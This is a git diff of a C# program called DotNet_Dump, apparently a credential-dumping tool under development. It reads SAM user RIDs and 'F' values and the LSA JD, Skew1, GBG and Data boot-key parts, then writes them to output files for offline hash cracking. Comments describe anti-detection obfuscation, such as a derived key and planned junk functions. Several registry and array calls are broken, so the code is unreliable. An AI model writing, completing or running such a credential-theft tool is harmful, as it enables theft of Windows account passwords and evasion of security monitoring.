@@ -1,7 +1,9 @@
 ﻿using Microsoft.Win32;
 using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
+using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
 using System.Threading.Tasks;
@@ -34,7 +36,7 @@ namespace DotNet_Dump
         {
             int status = 0, uselessVar1 = 0x22501984;
             string key, uselessVar2 = "AC1599DEFFBAB3A5CDDD";
-            string[] userRids, userValues;
+            string[] userRids, userValues, bootKeyValues;
 
             // Generate our key; continue to use and modify this key so we dont hard code it 
             key = genKey(uselessVar1, uselessVar2);
@@ -56,9 +58,13 @@ namespace DotNet_Dump
             // Grab all our user info
             status = grabUserInfo(key, out userRids, out userValues);
 
+            // Grab the info we need for our bootkey
+            getBootKeyValues(out bootKeyValues);
 
+            // Dump all our info to an output file
+            dumpInfo(bootKeyValues, userRids, userValues);
 
-
+            return;
         }
 
         /* Generate the base key to list our users 
@@ -90,8 +96,13 @@ namespace DotNet_Dump
             return key;
         }
 
-
-        // Grab user RIDs + their F values
+        /* Grab user RIDs + their F values
+         * Input:
+         *      uselessVar1 - useless :)
+         *      uselessVar2 - useless :)
+         * Return:
+         *      The translated stirng key to our users on target
+         * */
         static int grabUserInfo(in string key, out string[] userRids, out string[] userValues)
         {
             int status = 1, numUsers = 0;
@@ -115,15 +126,77 @@ namespace DotNet_Dump
                 userValues.Append(currUser.GetValue("F"));          
             }
 
+            users.Close();
+
             return status;
         }
 
+        /* Grab the bootkey (really just the JD, Skew1, GBG, and Data keys from LSA; we do the calculation later...)
+         * Input:
+         *      bootKeyValues - JD, Skew1, GBG and Data keys we need for the bootkey 
+         * Return:
+         *      N/A
+         * */
+        static void getBootKeyValues(out string[] bootKeyValues)
+        {
+            RegistryKey bootKeyPath = Registry.LocalMachine;
+            string[] keys = {"JD", "Skew1", "GBG", "Data"};
+            string path = "\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\";
+
+            bootKeyValues = new string[keys.Length];
+
+            foreach (string key in keys)
+            {
+                string updatedPath = path + key;
+
+                bootKeyPath.OpenSubKey(updatedPath);
+
+                bootKeyValues.Append(bootKeyPath.GetValue("")); // default value for this key 
+            }
+
+            return;
+        }
+
+        /* Dump all info to appropiate output files
+         * Input:
+         *      bootKeyValues - JD, Skew1, GBG and Data keys we need for the bootkey 
+         * Return:
+         *      N/A
+         * */
+        static void dumpInfo(in string[] bootKeyValues, in string[] userRids, in string[] userValues)
+        {
+            string dirName = "\\out";
+            DirectoryInfo di;
+            int index = 0;
+
+            // Make a dir for all the files
+            di = Directory.CreateDirectory(Directory.GetCurrentDirectory() + dirName);       
+
+            // Each filename will be a user RID
+            foreach (string userRid in userRids)
+            {
+                // Name may be wrong here, probably need full path 
+                using (StreamWriter outputFile = new StreamWriter(di.Name + "\\" + userRid + ".txt"))
+                {
+                    outputFile.WriteLine(userValues[index]); // their F key
+                    index++;
+                }
+            }
+
+            // Separate file for the bootkey info 
+            using (StreamWriter bootKeyFile = new StreamWriter(di.Name + "\\" + "key" + ".txt"))
+            {
+                foreach (string key in bootKeyValues)
+                {
+                    bootKeyFile.WriteLine(key);
+                }
+            }
+
+            return;
+        }
 
 
-
-
-
-        // Grab the bootkey
+        // Add random functions that do nothing 
 
 
 
